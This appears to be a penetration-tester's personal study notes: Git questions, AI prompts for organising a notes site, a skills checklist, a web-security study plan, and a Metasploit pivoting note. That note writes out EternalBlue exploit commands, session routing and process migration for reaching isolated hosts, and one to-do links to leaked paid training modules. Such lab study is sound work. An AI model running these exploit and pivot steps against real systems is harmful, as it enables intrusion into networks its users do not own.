---
created: 2026-04-18
sticker: lucide//bug
updated: 2026-10-18
---


Что такое коммит в системе контроля версий Git и какие данные он содержит?  
Каким образом Git создает идентификаторы (хэши) для каждого коммита?  
Как можно просмотреть историю коммитов и их хэши в Git?  
Что такое ветка в Git и как она отличается от основной ветки (master)?  
Как работает файл .gitignore в Git и для чего он используется?  
Как работает файл .gitkeep в Git и для чего он используется?  
Как правильно настроить .gitignore для исключения определенных файлов или папок из репозитория?

Formal, functional language. Concise. No figurative speech, no fluff. Prefer simpler, more direct words where the sense doesn't change (e.g., "use" rather than "utilize" or "leverage").

---

- [ ] Master what you already have on offensive stuff in HTB Labs
- [ ] Run an AI to fix writing
- [ ] As needed, use leaked modules to understand new attacks: https://github.com/PeterCullenBurbery/hack-the-box-academy
- [ ] Master your foundations: DevOps, scripting, and stuff.

---


```
This project is a Quartz website. All notes are inside the /content subdirectory and are out-of-scope for this specific session (telling you this explicitly, overrides any previous instructions I gave, but only for this session). We are now working on the website itself, its features and representation.


First, let's work on the style.
Instead of using a default Obsidian theme, modify it to match the vibes of my content and my preferences: sci-fi, dark-themed only; as accent colors, user red or blue (or use them together). 
```

- Search engines


- I want to set up:
	- A secure system
	- A backup/syncthing server
	- A custom mail server
	- A search engine aggregator, such as `SearXNG`

- `comm`
- `tee`

---

- I need you to take the methodology notes and notes linked to them and make sure they construct a map, clear methodology to testing. Following the links, one can perform a penetration test end-to-end. + no duplicates.
- My plan is to link all and every note in a tree style with general methodologies at the roots, more specific testing is at branches, and individual techniques are leaves. Example linking path: Pentesting methodology -> Web testing methodology -> Testing authentication -> OAuth attacks. Or Pentesting methodology -> Testing network services -> FTP anonymous login. Or Pentesting methodology -> AD & Windows testing methodology -> Windows privilege escalation -> `SeDebugPrivilege`. That that one can walk through all that easily.
- This tree must include every single note anyhow related to red teaming EXCEPT theoretical notes like in `Windows Internals/`, `Web Knowledge Base/`, or the entire `The Dev & Sec & Ops/` and `Uncategorized/` (they *may* be linked, but not necessarily be a part of the tree; these notes may or may not be orphans)
- During the process, you do not (and should not) read every note; this will only bloat your context and do nothing good. Read selectively. Otherwise rely on `tree` command, directory listing, or extract links to notes from one another. What you are working on primarily are the root methodology notes and your output to me (explaining me how to make it live) — I need a plan of action.
- It would be good if my notes include content from and align with the standards like WSTG for web (WSTG especially!)
- Starting point: 
- 
## Bash and the shell

### Shell basics

_Why: this is where most people's "good Linux" actually ends. Every one-liner you copy and can't debug is a gap here._

- [ ] Quoting rules: single vs double vs none, `$'...'`, when word splitting happens, why `"$@"` differs from `$*`
- [ ] Parameter expansion: `${var:-def}`, `${var:?}`, `${var#pat}`, `${var%pat}`, `${var/old/new}`, `${var:offset:len}`, `${#var}`, `${!prefix*}`
- [ ] Arrays and associative arrays: declaration, iteration, `"${arr[@]}"`, `declare -A`
- [ ] Command substitution `$( )` vs backticks, nesting, trailing-newline stripping
- [ ] Process substitution `<(cmd)` and `>(cmd)`
- [ ] Redirection in full: `>`, `>>`, `2>&1`, `&>`, `<<<`, heredocs (`<<EOF` vs `<<'EOF'`), `exec 3<>file`, `/dev/null`, `/dev/tcp/host/port`
- [ ] Exit codes, `$?`, `set -e` semantics and where it silently fails, `PIPESTATUS`
- [ ] `set -euo pipefail` and `IFS=$'\n\t'` as a default script header
- [ ] `trap` for cleanup on EXIT/INT/ERR
- [ ] Conditionals: `` `` vs `[ ]` vs `test`, pattern matching with `==`, regex with `=~` and `BASH_REMATCH`
- [ ] Loops: `while read -r line`, `for ((i=0;;))`, `until`, `case`
- [ ] Functions, `local`, return vs echo, subshell vs current shell (`( )` vs `{ }`)
- [ ] Argument parsing: `getopts`, `shift`, `--` convention
- [ ] Job control: `&`, `jobs`, `fg`/`bg`, `disown`, `nohup`, `wait`, `$!`
- [ ] Globbing vs regex, `shopt -s globstar nullglob extglob`
- [ ] `shellcheck` on everything you write

### Text processing

_Why: every pentest is a data-reshaping problem. Speed here is the single biggest force multiplier in recon and triage._

- [ ] `grep`: `-E`, `-P`, `-o`, `-r`, `-i`, `-v`, `-c`, `-A/-B/-C`, `-f file`, `-l`, `--include`, `-z`
- [ ] `ripgrep`: same plus `--json`, `-g` globs, searching binaries, why it beats grep for codebases
- [ ] `sed`: substitution with groups, addresses/ranges, `-i`, `-n` with `p`, `d`, `y`, multiline basics
- [ ] `awk`: fields, `NR`/`NF`/`FS`/`OFS`, `BEGIN`/`END`, conditions, arrays, `printf`, multi-file. Aim for real awk, not just `awk '{print $1}'`
- [ ] `cut`, `paste`, `tr`, `column -t`, `rev`, `fold`, `expand`
- [ ] `sort`: `-u`, `-n`, `-k`, `-t`, `-r`, `-V`, stability
- [ ] `uniq`: `-c`, `-d`, `-u`, and why it needs sorted input
- [ ] `comm`, `join`, `diff -u`, `patch`, `wdiff`
- [ ] `head`, `tail -f`, `tail -n +N`, `split`, `shuf`, `nl`, `wc`
- [ ] `xargs`: `-n`, `-P`, `-I{}`, `-0`, `-a`, combining with `find -print0`
- [ ] `tee`, `pv`, `script` for session recording
- [ ] Regex proper: greedy vs lazy, anchors, lookarounds (PCRE only), character classes, backreferences, catastrophic backtracking

### Filesystem and search

_Why: privesc and forensics both reduce to "find the one file that shouldn't be like that."_

- [ ] `find`: `-name`, `-iname`, `-type`, `-perm` (including `-4000`, `-g+s`), `-user`, `-group`, `-mtime`/`-newer`, `-size`, `-exec` vs `-exec +` vs `xargs`, `-prune`, `-maxdepth`, `-print0`
- [ ] `stat`, `file`, `lsattr`/`chattr`, `readlink -f`, `realpath`
- [ ] `ls -la` read fluently: permission bits, setuid/setgid/sticky, ACLs (`getfacl`), extended attributes
- [ ] `chmod` in octal and symbolic, `umask`, `chown`, capabilities (`getcap`/`setcap`)
- [ ] `du`, `df`, `mount`, `findmnt`, `losetup`, `/proc` and `/sys` navigation
- [ ] `locate`/`plocate`, `which`, `whereis`, `type`, `command -v`
- [ ] `fzf` wired into your shell for history and file selection

### Processes, users, services

_Why: post-exploitation and blue-side investigation are the same commands with different intent._

- [ ] `ps aux` / `ps -ef` / `ps -eo` custom columns, `pstree`
- [ ] `top`/`htop`, `lsof`, `fuser`, `strace`, `ltrace`
- [ ] `kill`, signals, `pkill`, `pgrep`, `timeout`
- [ ] `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/sudoers` and `sudo -l` read fluently
- [ ] `su`, `sudo -u`, `runuser`, `setpriv`, `id`, `groups`
- [ ] `systemctl`, `journalctl -u/-f/--since`, unit file anatomy, timers, user units
- [ ] `crontab -l/-e`, `/etc/cron.*`, `at`, systemd timers as the modern equivalent
- [ ] `env`, `export`, `PATH` semantics, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `.bashrc` vs `.profile` load order
- [ ] `ulimit`, `nice`/`ionice`, namespaces and cgroups at a conceptual level

### Networking from the shell

_Why: you should never be blocked by "I can't see what's on the wire."_

- [ ] `curl` deeply: `-H`, `-d`, `--data-binary`, `-F`, `-X`, `-b`/`-c` cookie jars, `-x` proxy through Burp, `-k`, `-L` and manual redirect following, `--resolve`, `-w` timing format, `-o`/`-O`, `--http1.1`/`--http2`, `-i`/`-v`/`--trace`
- [ ] `wget` mirroring and recursive download
- [ ] `ss -tulpn` (and the `netstat` equivalents you'll still meet)
- [ ] `ip addr/route/link/neigh`, `ip netns` basics
- [ ] `dig` (`+short`, `+trace`, ANY/AXFR attempts, `@server`), `host`, `nslookup`, `whois`
- [ ] `nc` / `ncat` / `socat`: listeners, port scanning, file transfer, TTY upgrade, port forwarding, TLS wrapping with socat
- [ ] `ssh`: key management, `~/.ssh/config`, `-L`, `-R`, `-D` dynamic SOCKS, `ProxyJump`, `ProxyCommand`, agent forwarding and why it's dangerous
- [ ] `sshuttle`, `chisel`, `ligolo-ng` for pivoting
- [ ] `tcpdump` with real BPF filters, `-w`/`-r`, plus Wireshark/`tshark` for analysis
- [ ] `nmap`: host discovery, `-sS`/`-sT`/`-sU`, `-sV`, `-sC`, NSE script selection, timing templates, `-oA`, output parsing
- [ ] `openssl s_client -connect -servername`, cert inspection, `openssl x509 -text`, cipher enumeration
- [ ] `iptables`/`nftables` read-level, enough to understand a host firewall you land on

### Data formats and encoding

_Why: modern targets speak JSON and JWT, not text files._

- [ ] `jq`: selection, filters, `map`, `select`, `to_entries`, `-r`, `@csv`, building JSON, slurp mode. This is a language, treat it as one
- [ ] `yq` for YAML, `xmlstarlet` or `xmllint --xpath` for XML
- [ ] `base64` (`-d`, `-w0`), `xxd`, `hexdump -C`, `od`
- [ ] URL encoding/decoding from the shell, `jwt` decoding by hand with `cut` + `base64`
- [ ] `iconv`, line-ending handling (`dos2unix`), UTF-8 vs Latin-1 issues in payloads
- [ ] `md5sum`/`sha256sum`, `openssl dgst`, `hashid`
- [ ] `tar`, `gzip`/`zstd`, `zip`/`unzip`, `7z`, `binwalk` for unknown blobs

### Environment and workflow

_Why: friction compounds. A slow environment costs you hours per engagement._

- [ ] `tmux`: sessions, windows, panes, detach/attach, copy mode, scripted session setup, logging panes
- [ ] History control: `HISTCONTROL`, `HISTIGNORE`, reverse search, `!!`, `!$`, `^old^new`
- [ ] Your own `~/bin` of small scripts on `PATH`
- [ ] `vim` at working proficiency (you will land on boxes without your editor)
- [ ] `less` navigation and search, `bat` for local reading
- [ ] `watch`, `entr` for rerun-on-change loops
- [ ] Reproducible environment: dotfiles in Git, an install script, and the ability to rebuild your Arch setup in an hour

---

## Python

### Language fluency

_Why: "Python with eyes closed" means you never stop to look up syntax mid-engagement._

- [ ] Data model: mutability, identity vs equality, truthiness, shallow vs deep copy
- [ ] Comprehensions (list/dict/set), generators, `yield`, laziness
- [ ] Unpacking, `*args`/`**kwargs`, keyword-only args, default-argument mutation trap
- [ ] Context managers (`with`, `contextlib.contextmanager`)
- [ ] Decorators, including ones that take arguments
- [ ] Classes: `__init__`, dunder methods, `@property`, `dataclass`, inheritance vs composition
- [ ] Exceptions: custom classes, `raise from`, `finally`, `else`, not swallowing broadly
- [ ] Iterators vs iterables, `itertools` (`chain`, `product`, `islice`, `groupby`, `cycle`)
- [ ] `functools` (`lru_cache`, `partial`, `wraps`)
- [ ] Type hints and `mypy`/`pyright` at a level that catches real bugs
- [ ] f-strings including `=`, format specs, `!r`
- [ ] Encoding: `str` vs `bytes`, `.encode()`/`.decode()`, when to stay in bytes (always, for payloads)

### Standard library you should know cold

_Why: on a locked-down host there is no pip._

- [ ] `os`, `sys`, `pathlib`, `shutil`, `tempfile`, `glob`
- [ ] `subprocess` done safely: list args, `capture_output`, `check`, timeouts, why `shell=True` is a vulnerability
- [ ] `argparse` (subcommands, types, mutually exclusive groups)
- [ ] `logging` configured properly, not `print`
- [ ] `json`, `csv`, `configparser`, `tomllib`
- [ ] `re` including compiled patterns, named groups, `finditer`, `sub` with a function
- [ ] `socket`, `ssl`, `select`
- [ ] `http.server`, `urllib.parse` (`urlencode`, `quote`, `urljoin`, `urlsplit`)
- [ ] `base64`, `hashlib`, `hmac`, `secrets`, `binascii`, `struct`
- [ ] `datetime` and timezone handling
- [ ] `threading`, `queue`, `multiprocessing`, `concurrent.futures`
- [ ] `asyncio` fundamentals: event loop, `async def`, `await`, `gather`, semaphores for rate limiting
- [ ] `collections` (`defaultdict`, `Counter`, `deque`, `namedtuple`)
- [ ] `sqlite3` for local result storage

### Libraries worth real depth

_Why: these cover ~90% of offensive and product-security scripting._

- [ ] `requests` and `httpx`: sessions, connection reuse, custom adapters, retries, timeouts, proxying to Burp, disabling TLS verification deliberately, streaming, raw byte control
- [ ] `aiohttp` or `httpx.AsyncClient` for concurrent scanning
- [ ] `BeautifulSoup` + `lxml`, CSS selectors and XPath
- [ ] `playwright` (preferred) or `selenium` for JS-rendered apps and authenticated flows
- [ ] `mitmproxy` as a library and addon platform. Writing a mitmproxy addon is the most useful "custom tooling" skill in web testing
- [ ] `pycryptodome` and `cryptography`: AES modes, padding oracles, RSA, key formats
- [ ] `pyjwt` plus manual JWT manipulation without it
- [ ] `paramiko`, `impacket` (read its examples as a source of protocol knowledge)
- [ ] `scapy` for packet crafting when tcpdump isn't enough
- [ ] `boto3` / `google-cloud-*` / `azure-sdk` for cloud enumeration scripting
- [ ] `rich` or `textual` for readable CLI output
- [ ] `pandas` only if you're doing real dataset work, otherwise skip

### Automation you should be able to build from scratch

_Why: this is the actual test. Certifications say you learned; these say you can produce._

Build each one at least once, small and working, not perfect:

- [ ] **Concurrent HTTP prober**: takes a URL list, hits each with configurable concurrency, records status/length/title/tech, handles timeouts and retries, outputs JSONL
- [ ] **Recon pipeline glue**: chains subdomain enumeration → resolution → port scan → HTTP probe → screenshot, deduplicating and storing results in SQLite, resumable after interruption
- [ ] **Authenticated request harness**: logs into an app, maintains session/CSRF/refresh tokens, and exposes a function you can fuzz through. This is the one most people can't write and it gates all deep testing
- [ ] **Custom fuzzer**: takes a request template with markers, iterates a wordlist, filters by response differences, supports rate limiting and baseline comparison
- [ ] **Mitmproxy addon**: flags interesting responses, auto-tests a header for reflection, or rewrites a token on the fly
- [ ] **Burp output parser**: reads exported Burp/ZAP XML or JSON, dedupes, produces a findings table
- [ ] **Diff monitor**: watches JS files or API responses for changes over time and alerts. High-value for bug bounty
- [ ] **JS endpoint and secret extractor**: pulls URLs, API paths and key patterns out of bundles
- [ ] **Cloud IAM analyzer**: dumps GCP IAM bindings and computes privilege escalation paths as a graph. Directly feeds your differentiator
- [ ] **Report generator**: takes structured findings (YAML/JSON) and renders a templated Markdown or DOCX report with CVSS, evidence and remediation. This automates your weakest area
- [ ] **Exploit PoC template**: a clean single-file script with argparse, logging, error handling, and a `--check` mode, so every PoC you write starts consistent
- [ ] **Log/alert triage script**: for the blue-side half of a hybrid role, parse logs and correlate against a rule set
- [ ] **CI security gate**: a script that runs in a pipeline, calls a scanner, filters known-accepted findings, and fails the build on new ones

### Code quality (this is what "engineer" means in the job title)

_Why: hybrid and product-security roles read your code. Scripts that only work on your machine disqualify you quietly._

- [ ] Virtual environments, `pyproject.toml`, `uv` or `pip-tools` for pinned dependencies
- [ ] `ruff` for lint and format, in a pre-commit hook
- [ ] `pytest`: fixtures, parametrize, mocking HTTP with `responses`/`respx`
- [ ] Packaging a CLI as an installable entry point
- [ ] A real README with usage examples
- [ ] Semantic versioning, changelog, tagged releases
- [ ] Secrets never in code: env vars, `.env` excluded, config files

---

## Git and engineering hygiene

### Git core

_Why: you'll be reviewing code, contributing fixes, and reading history for secrets. Also, "can't rebase" reads as junior._

- [ ] `add -p`, staging area model, what a commit actually is
- [ ] Branching, `merge` vs `rebase`, fast-forward vs merge commits
- [ ] Interactive rebase: squash, reword, reorder, split
- [ ] Conflict resolution without panic, `rerere`
- [ ] `stash`, `cherry-pick`, `revert` vs `reset` (`--soft`/`--mixed`/`--hard`)
- [ ] `reflog` as the undo button for everything
- [ ] `log` with `-S`/`-G` pickaxe, `--follow`, `--all --graph`, `blame`, `bisect`
- [ ] Remotes, tracking branches, `fetch` vs `pull`, force-with-lease
- [ ] `.gitignore`, `.gitattributes`, submodules and why to avoid them
- [ ] Tags, signed commits with GPG or SSH
- [ ] Hooks (pre-commit, pre-push) and the `pre-commit` framework
- [ ] Good commit messages and a clean PR: small, focused, described

### Git as an attack and defense surface

_Why: this is a recurring finding class and a recurring recon technique._

- [ ] Finding secrets in history: `gitleaks`, `trufflehog`, pickaxe search
- [ ] Why deleting a secret in a new commit doesn't remove it, and how rewriting history actually works (`filter-repo`)
- [ ] Exposed `.git` directories on web servers and how to reconstruct a repo from one
- [ ] Dangling objects, `git fsck`, recovering deleted branches
- [ ] Supply chain: dependency confusion, typosquatting, lockfile integrity, `npm`/`pip` install-time code execution
- [ ] Branch protection, required reviews, CODEOWNERS as controls you'd design

### CI/CD

_Why: pipelines are both where product security lives and one of the highest-value attack surfaces in a cloud org._

- [ ] Write a GitHub Actions workflow from scratch: triggers, jobs, matrix, caching, artifacts
- [ ] Secrets in CI: how they're injected, how they leak in logs, OIDC federation instead of long-lived keys
- [ ] `pull_request_target` and similar dangerous triggers
- [ ] Self-hosted runner risks
- [ ] Integrate SAST/SCA/secret scanning and, more importantly, tune out the noise
- [ ] Equivalent literacy in GitLab CI or Cloud Build, since you'll be on GCP

## 3.4 Containers and orchestration

_Why: everything you test will be containerized, and misconfigurations here are reliable findings._

- [ ] Dockerfile authoring, layers, multi-stage builds, non-root users, minimal base images
- [ ] `docker run` flags that matter for security: `--privileged`, capabilities, mounts, network modes
- [ ] Image inspection: `docker history`, `dive`, extracting layers, finding secrets in images
- [ ] `docker-compose` for spinning up lab targets
- [ ] Container escape concepts: exposed socket, privileged mode, host mounts, capability abuse
- [ ] Kubernetes minimum: pods, services, RBAC, service accounts, `kubectl` basics, `kubectl auth can-i`, reading a manifest for misconfiguration

## 3.5 Infrastructure as code and cloud CLI

_Why: your GCP niche runs on this, and IaC review is a real product-security job function._

- [ ] Terraform: read fluently, write competently, `plan` diffing, state file sensitivity, modules
- [ ] `tfsec`/`checkov`-style scanning and what it misses
- [ ] `gcloud` deeply: `iam` commands, `--impersonate-service-account`, `asset` inventory, `projects get-iam-policy`, `--format` and `--filter`
- [ ] `aws` and `az` CLI at working level for cross-cloud credibility
- [ ] Ansible read-level, enough to audit playbooks

## 3.6 Adjacent fundamentals

_Why: gaps here show up as hesitation in interviews._

- [ ] SQL: joins, subqueries, `UNION`, information_schema, enough to write injection payloads without a cheatsheet
- [ ] HTTP in detail: methods, status codes, caching headers, CORS, cookies and their attributes, HTTP/2 and request smuggling preconditions
- [ ] TLS: handshake, cert chains, SNI, pinning, common misconfigurations
- [ ] DNS: record types, resolution path, zone transfers, subdomain takeover conditions
- [ ] JavaScript at reading level: async, fetch, DOM, prototype chain, bundler output. You can't test modern web apps without this
- [ ] One compiled language at reading level (Go, since half of offensive tooling is written in it)
- [ ] Markdown and a documentation habit

---

# Part 4 — How to know something is actually "done"

Your notes-based definition works, with one addition. Split every item above into two buckets:

- [ ] **Reference** (rare, complex): a note with a working example is sufficient
- [ ] **Reflex** (common): must run correctly from memory, under time pressure, with no notes open

Drills that test the reflex bucket honestly:

- [ ] Reconstruct your whole toolchain on a fresh VM in under an hour, from your dotfiles repo
- [ ] Given a 50MB log file, answer three non-trivial questions about it in under five minutes, pipeline only
- [ ] Write the authenticated request harness for an unfamiliar app in under two hours
- [ ] Solve an HTB box with Obsidian closed and no Google, logging every command
- [ ] Take one of your old scripts and make it pass `ruff`, `mypy` and a small `pytest` suite
- [ ] Explain a Terraform plan diff's security impact out loud in two minutes

## Deliberately skip

Perl beyond reading it. `sed` multiline wizardry. Bash for anything over ~150 lines (switch to Python). Memorizing nmap NSE script names. `pandas` unless you need it. Writing your own port scanner past the once-for-learning version.

# drafts

- Fundamentals to master:
	- `tmux`
	- Every bit on SSH 
	- PEM, certificates, and friends; how to generate and other jokes

- `NTDS.dit` dumping 

- Bash fundamentals to refer to and know by heart:
	- `git`, a lot of useful commands, tips, tricks
	- `sed`
	- `grep`
- How Nagios 5.7.5 CVE works
- Essential PowerShell commands

- Ideas:
	- Cyber TLDR
	- Better syntax highlight for Obsidian

- To do:
	- [x] Potato attacks
	- [ ] `socat` guide


- Dedicated process ID spoofing note; currently under `SeDebugPrivilege`
"I swear, the certificate rush will end one day, but let me have fun for how!"


- Web:
	1. [ ] Finish `🛠️ DOM-based vulnerabilities` (manually)
	2. [ ] Finish `🛠️ Host header injection` (AI. Gemini one run)
	3. [ ] Finish `🛠️ Prototype pollution` (AI. Gemini one run)
	4. [ ] Finish `🛠️ WebSocket vulnerabilities` (AI. Gemini one run)
	5. [ ] Finish `🛠️ Clickjacking` (manually, then AI)
	6. [ ] Finish `🛠️ Logic flaws` (AI, existing)
	7. [ ] Finish `🛠️ Race conditions` and finish labs
	8. [ ] Finish `🛠️ Web Cache Poisoning`
	9. [ ] Finish HTTP request smuggling
	10. [ ] Deal with Authentication & Authorization after Windows & AD.
		- [ ] `🛠️ Vulnerabilities in MFA`
		- [ ] `🛠️ Vulnerabilities in password-based login`
		- [ ] `🛠️ Other authentication vulnerabilities`
	

- Change organization in folders

- WHOIS done, add RDAP

- Each vulnerability note must:
	- Have a table of contents 
	- CWE classifications + links

- Split big topics into several notes:
	- HTTP request smuggling:
		- HTTP and how request smuggling works
		- Testing for HTTP/1.1 request smuggling
		- HTTP/2 desync attacks
- Connect notes.

- A cheat sheet: 
	- Which bugs are better detected via dynamic analysis vs. static code analysis?

---

More for knowledge base but:
- TLS, how it works + certificates, fields, how to query them
### Tier 1: Excellent (polish only)

These are your best work — deep, methodical, practitioner-grade. Need only minor fixes.

| File                           | Size        | Notes                                                                               |
| ------------------------------ | ----------- | ----------------------------------------------------------------------------------- |
| CSRF.md                        | 50KB        | Outstanding.                                                                        |
| SSRF.md                        | 40KB        | Excellent methodology + bypasses.                                                   |
| Hacking WordPress.md           | 67KB        | Comprehensive. Excellent regex breakdowns                                           |
| SQL injection.md + cheat sheet | 48KB + 52KB | Solid                                                                               |
| SSTI.md                        | 35KB        | Very good. Some sections empty (Twig, Smarty, FreeMarker, Velocity — lines 551-567) |
| XXE injection.md               | 46KB        | Good                                                                                |
| XSS.md                         | 38KB        | Good                                                                                |
| Web Cache Deception.md         | 39KB        | Good                                                                                |

### Tier 2: Substantial but incomplete

| File                                             | Size | Issues                                                                                                                                   |
| ------------------------------------------------ | ---- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `🛠️ DOM-based vulnerabilities.md`               | 55KB | Large but needs review for completeness                                                                                                  |
| `🛠️ WebSocket vulnerabilities.md`               | 28KB | Needs review                                                                                                                             |
| `🛠️ Vulnerabilities in password-based login.md` | 35KB | Large but 🛠️ — verify completeness                                                                                                      |
| IDOR.md                                          | 31KB | Needs review                                                                                                                             |
| `🛠️ Web Cache Poisoning.md`                     | 28KB | Needs completion                                                                                                                         |
| `🛠️ CORS.md` (in Web KB/Client-Side)            | 36KB | Substantial                                                                                                                              |
| `🛠️ Obfuscating attacks using encoding.md`      | 15KB | Needs completion                                                                                                                         |
| `🛠️ HTTP request smuggling 1.md`                | 12KB | **Contains raw AI prompts as instructions** (lines 5-16). This is a second file for the same topic — merge or split clearly              |
| `🛠️ Host header injection.md`                   | 31KB | Needs completion                                                                                                                         |
| `🛠️ Clickjacking.md`                            | 9KB  | Needs expansion                                                                                                                          |
| `🛠️ Vulnerabilities in MFA.md`                  | 9KB  | Needs expansion                                                                                                                          |
| `🛠️ Prototype pollution.md`                     | 19KB | Good client-side coverage. Missing: `## Validation bypass` (empty), `## Server-side prototype pollution` (4 bullet points only)          |
| OAuth attacks.md                                 | 22KB | Needs review                                                                                                                             |
| `🛠️ Logic flaws.md`                             | 6KB  | Good structure, but thin — needs examples and more depth                                                                                 |
| GraphQL attacks.md                               | 29KB | Needs review                                                                                                                             |
| HTTP request smuggling.md                        | 54KB | Rewrite, review.                                                                                                                         |
| Race conditions.md                               | 28KB | Needs labs/finishing                                                                                                                     |
| `🛠️ Insecure Deserialization.md`                | 46KB | **Massive overlap with the BSCP Guide.** Has a `# drafts` section (line 712) with duplicate tables. Merge or clearly differentiate roles |
| Insecure Deserialization — BSCP Guide.md         | 58KB | Rewrite, review. **Has AI prompt/career notes leaked into lines 5-10** — must be cleaned                                                 |

### Tier 3: Stubs & empty files (critical gaps)

These files contain **nothing useful** — just a frontmatter date or a single line:

| File                                          | Content               |
| --------------------------------------------- | --------------------- |
| `🛠️ Other authentication vulnerabilities.md` | 4KB — thin            |

- Web knowledge base:

| File                            | Content                      |
| ------------------------------- | ---------------------------- |
| `🛠️ URL.md`                    | Empty (4 lines)              |
| `🛠️ HTTP methods reference.md` | Empty (4 lines)              |
| `🛠️ HTTP response codes.md`    | 1 line: `## 3xx – Redirects` |


- Main resource: [PortSwigger Web Security Academy](https://portswigger.net/web-security)

Rule: **Follow the Web Security Academy path strictly. Or you will bury yourself in all possible web vulnerabilities and researches for another 100 years.**
The main goal now is the **certificate** -> job you want. Not Bug Bounty — for now. Complete one milestone then move on, or you will be a forever-student.  
## Server-side topics

- SQL injection
	- `SQL injection` <- make it better once you finish the cheat sheet
	- `SQL injection cheat sheet`
	- `sqlmap`
- Authentication
	- `🛠️ Vulnerabilities in password-based login`
	- `🛠️ Vulnerabilities in MFA`
	- `🛠️ Other authentication vulnerabilities`
- Path traversal 
	- `Path traversal` <- finish
- Command injection
	- `OS command injection`
- Business logic vulnerabilities
	- `🛠️ Logic flaws` <- write
- Information disclosure
- Access control
	- `IDOR`
- File upload vulnerabilities
	- `File upload`
- Race conditions (kettle, kettle...)
	- `🛠️ Race conditions` <- finish + labs
- Server-side request forgery (SSRF)
	- `SSRF`
- XXE injection
	- `XXE injection`
- NoSQL injection 
	- `NoSQL injection` <- write
- API testing
	- `API testing`
- Web cache deception
	- `Web Cache Deception`

## Client-side topics

- Cross-site scripting (XSS)
	- `XSS`
- Cross-site request forgery (CSRF)
	- `CSRF`
- Cross-origin resource sharing (CORS)
	- `🛠️ CORS`
- Clickjacking
	- `🛠️ Clickjacking` <- write
- DOM-based vulnerabilities 
	- 
- WebSockets
	- `🛠️ WebSocket vulnerabilities`

## Advanced topics

- Insecure deserialization 
	- `Insecure Deserialization` <- finish
- Web LLM attacks
- GraphQL API vulnerabilities 
	- `GraphQL attacks`
- Server-side template injection
	- `SSTI` <- finish
- Web cache poisoning
	- `🛠️ Web Cache Poisoning` <- finish
- HTTP Host header attacks
	- `🛠️ Host header injection` <- finish
- HTTP request smuggling (kettle, kettle...)
	- `HTTP request smuggling draft 0` <- finish
- OAuth authentication
	- `🛠️ OAuth` <- finish
- JWT attacks
	- `JWT attacks`
- Prototype pollution
- Essential skills
	- `🛠️ Obfuscating attacks using encoding` <- finish



Between the HTB `Discord`, `Forums`, and `blogs`, there are plenty of outstanding write-ups to help advance your skills along the way. One to pay attention to would be [0xdf's walkthroughs](https://0xdf.gitlab.io/). His blog is a great resource to help us understand how the tools, tactics, and concepts we are learning tie together into a holistic attack path. The list below contains links to other authors and blogs we feel do a great job discussing Information Security topics.

[RastaMouse](https://rastamouse.me/) writes excellent content on Red-Teaming, C2 infrastructure, pivoting, payloads, etc. (He even made a Pro Lab to showcase those things!)

[SpecterOps](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6) has written a great post covering SSH Tunneling and the use of proxies over a multitude of protocols. It's a must-read for anyone looking to know more about the subject and would make a handy resource to have during an engagement.

The [HTB Blog](https://www.hackthebox.com/blog) is, of course, a great place to read up on current threats, how-to's for popular TTPs, and more.

[SANS](https://www.sans.org/webcasts/dodge-duck-dip-dive-dodge-making-the-pivot-cheat-sheet-119115/) puts out plenty of great infosec related information and webcasts like the one linked here are a great example of that. This will cover many different Pivoting tools and avenues of use.

[Plaintext's Pivoting Workshop](https://youtu.be/B3GxYyGFYmQ) is an incredible workshop that our very own Academy Training Developer, Plaintext, put together to help prepare players for Cyber Apocalypse CTF 2022. The workshop is delivered in an engaging & entertaining manner, and viewers will benefit from it for years to come. Check it out if you get the chance.


## Chaining pivots through multiple hosts

- A **chained pivot** (double pivot) relays traffic through two or more compromised hosts to reach a network segment that is multiple hops away from your machine.

```mermaid
flowchart LR
    A["Your machine\n10.10.14.2"] -->|"Session 1"| B["Pivot A\n10.10.11.5 / 172.16.5.1"]
    B -->|"Session 2"| C["Pivot B\n172.16.5.10 / 192.168.1.1"]
    C --> D["Target\n192.168.1.50"]
```

- Pivot A has interfaces on `10.10.11.0/24` (your network) and `172.16.5.0/24` (internal). Pivot B has interfaces on `172.16.5.0/24` and `192.168.1.0/24` (isolated segment). The target sits on `192.168.1.0/24`, two hops away.

### Building a chained pivot

1. Compromise Pivot A and establish session 1.

2. Add a route to Pivot B's network through session 1:

```bash
route add 172.16.5.0 255.255.255.0 1
```

3. Exploit Pivot B through session 1. Since `172.16.5.0/24` is now routed through session 1, Metasploit targets Pivot B directly:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.5.10
set payload windows/meterpreter/bind_tcp
set RHOST 172.16.5.10
set LPORT 4444
exploit
```

- This establishes session 2 on Pivot B.

4. Add a route to the final target's network through session 2:

```bash
route add 192.168.1.0 255.255.255.0 2
```

5. Access the final target. Metasploit chains the routes automatically: traffic for `192.168.1.0/24` goes through session 2, which itself is tunneled through session 1.

>[!warning] If session 1 drops, the entire chain breaks — session 2 and all routes through it become invalid. Migrate to a stable system process (such as `spoolsv.exe` or `svchost.exe`) on each pivot immediately after landing a session.

>[!tip]+
> - Use `bind_tcp` for second-hop exploitation to avoid nested reverse port forwards.
> - Use `autoadd` on each pivot to avoid missing discoverable subnets.
> - Performance degrades with each hop. Keep scans targeted — don't sweep entire subnets through a double pivot.
> - For production-grade multi-hop tunnels, consider dedicated tools like `Chisel` or `🛠️ Ligolo-ng`, which handle chained tunnels more reliably than Meterpreter.

## Common pitfalls

### Session stability

| Problem | Cause | Fix |
| :--- | :--- | :--- |
| Session dies during scans. | Aggressive scans overload the tunnel. | Use targeted scans with specific ports and IP ranges. |
| Session drops when a user logs out. | Payload runs in a user-space process. | Migrate to a system process: `migrate -N spoolsv.exe`. |
| Second stage fails to load. | Unstable connection between hops. | Use stageless payloads. |
| Session hangs. | Channel timeout. | Adjust `SessionCommunicationTimeout` in the handler options. |

### Payload and routing issues

| Problem | Cause | Fix |
| :--- | :--- | :--- |
| Reverse shell doesn't arrive. | `LHOST` set to your IP instead of the pivot's internal IP. | Set `LHOST` to the pivot's internal address that the target can reach. |
| Module can't reach internal target. | No route exists for the target's subnet. | Run `route print` and verify. Add the missing route. |
| Route exists but module fails. | Session is dead. | Check with `sessions -l`. Dead sessions invalidate their routes. |
| Nmap scan returns no results. | Using SYN scan or ICMP ping through SOCKS. | Use `-sT -Pn -n` flags. |
